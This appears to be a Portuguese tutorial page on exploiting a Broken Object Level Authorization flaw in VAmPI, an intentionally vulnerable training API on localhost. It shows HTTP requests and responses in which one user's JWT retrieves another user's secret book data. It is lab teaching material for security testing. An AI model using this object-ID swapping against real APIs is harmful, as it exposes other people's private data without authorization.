---
sidebar_position: 2
---

# Exploração
---
Tendo em mente os questionamentos levantados ao final da sessão anterior, é possível realizar os testes de segurança a fim de descobrir onde a vulnerabilidade pode ser explorada.

Uma rota muito interessante para realizar esse teste de segurança é justamente o de manipulação de livros, o principal objeto da nossa API vulnerável, se trata da rota `/books/v1/`.

Nessa rota, um usuário pode acessar seus livros a partir dos títulos, retornando o segredo que foi armazenado juntamente com o livro. É importante ressaltar que os livros são pertencentes apenas a um usuário, sendo necessário realizar a autenticação antes de acessar essas informações.

## Autenticação na aplicação
Para que um usuário acesse seus livros, é necessário que o mesmo se autentique na aplicação, para isso basta utilizar a rota `/users/v1/login` usando uma requisição do tipo `POST` enviando as informações de login no body da requisição.

```python title="Request de login na aplicação"
POST /users/v1/login HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.2
Accept: */*
Postman-Token: 8c0e8020-2efc-4460-b63c-04b5f7d5ba84
Host: localhost:5000
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 56

{
    "username": "jordan",
    "password": "password"
}
```
Na response, um token JWT é enviado e, através dele, que a autenticação será realizada em todas as requisições futuras.

```python title="Response de login na aplicação"
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 225
Server: Werkzeug/1.0.1 Python/3.8.10
Date: Sat, 28 Jan 2023 18:38:43 GMT

{
    "auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
    eyJleHAiOjE2NzU5MzExMjIsImlhdCI6MTY3NDkzMTEyMywic3ViIjoiam9yZGFuIn0.
    hsFkgBl3aNHzEZ3a3ZoSw3tkO2JblOjbLdX9EJ2lIwA",
    "message": "Successfully logged in.",
    "status": "success"
}
```

## Consultando o livro de um usuário
Antes de mais nada, para guiar nossos testes, vamos conhecer os livros que estão presentes no bando de dados da aplicação. Basta fazer uma requisição do tipo `GET` para o endpoint `/books/v1` sem informar um titúlo específico.

```json title="Títulos dos livros salvos"
{
    "Books": [
        {
            "book_title": "bookTitle77",
            "user": "name1"
        },
        {
            "book_title": "bookTitle17",
            "user": "name2"
        },
        {
            "book_title": "bookTitle70",
            "user": "admin"
        },
        {
            "book_title": "Teste_segurança",
            "user": "jordan"
        },
        {
            "book_title": "Receitas_de_familia",
            "user": "name2"
        }
    ]
}
```
O usuário **jordan**, ao qual foi feita a autenticação no tópico anterior, possui o livro *Teste_segurança*.

Agora, com o usuário logado, será realizada uma requisição do tipo `GET` para a rota `/books/v1/:book_title`, que necessita de autenticação para trazer as informações adicionais do livro, funcionando apenas para o usuário que o possui.

_Nota: O caractere **ç** é exibido como %C3%A7 por estar codificado em UTF-8 para as requisições e respostas._

```python title="Request legítima de informações sobre o livro Teste_segurança"
GET /books/v1/Teste_seguran%C3%A7a HTTP/1.1
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
eyJleHAiOjE2NzU5MzExMjIsImlhdCI6MTY3NDkzMTEyMywic3ViIjoiam9yZGFuIn0.
hsFkgBl3aNHzEZ3a3ZoSw3tkO2JblOjbLdX9EJ2lIwA
User-Agent: PostmanRuntime/7.29.2
Accept: */*
Postman-Token: 0cdc66aa-0178-418c-a1f9-91b3f7c760f1
Host: localhost:5000
Accept-Encoding: gzip, deflate
Connection: close
```

A resposta recebida foi o esperado: As informações completas do livro do usuário.

```json
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 105
Server: Werkzeug/1.0.1 Python/3.8.10
Date: Sat, 28 Jan 2023 18:41:03 GMT

{
    "book_title": "Teste_seguran\u00e7a",
    "owner": "jordan",
    "secret": "Broken Level Object Authorization!"
}
```

## Vulnerabilidade na rota `/books/v1/:book_title`
Para identificar a vulnerabilidade, as perguntas apresentadas pelo tópico anterior são o suficiente.

Tendo essas pergunta em mente, é hora de checar se um usuário poderia acessar as informações secretas do livro de outro usuário, utilizando apenas o título para isso.

No banco de dados existe um usuário chamado **name2**, que será a vítima do teste de consulta de informações sobre os seus livros.

Utilizando o token de autenticação do usuário **jordan** será feita uma requisição do tipo `GET` para o endpoint `/books/v1/:book_title`. Porém, será utilizado o título **Receitas_de_familía**, que é pertencente ao usuário **name2**.

```python title="Request maliciosa para o endpoint /books/v1/Receitas_de_familia usando o token de acesso do usuário jordan"
GET /books/v1/Receitas_de_familia HTTP/1.1
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
eyJleHAiOjE2NzU5MzExMjIsImlhdCI6MTY3NDkzMTEyMywic3ViIjoiam9yZGFuIn0.
hsFkgBl3aNHzEZ3a3ZoSw3tkO2JblOjbLdX9EJ2lIwA
User-Agent: PostmanRuntime/7.29.2
Accept: */*
Postman-Token: 785d837a-3b9b-416f-8c00-38ced9b040da
Host: localhost:5000
Accept-Encoding: gzip, deflate
Connection: close
```

Após realizar a requisição, houve a seguinte reposta:

```json title="Response maliciosa"
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 128
Server: Werkzeug/1.0.1 Python/3.8.10
Date: Sat, 28 Jan 2023 19:36:04 GMT

{
    "book_title": "Receitas_de_familia",
    "owner": "name2",
    "secret": "Livro com todas as receitas secretas da minha fam\u00edlia."
}
```

A resposta do VAmPI indica que a vulnerabilidade Broken Level Authorization está presente na API, onde não está sendo realizada a validação do usuário antes de fornecer o acesso a um objeto.

Dessa forma, é possível consultar o segredo dos livros de todos os usuários da aplicação.

#### Mais referências disponíveis na [OWASP](https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa8-injection.md).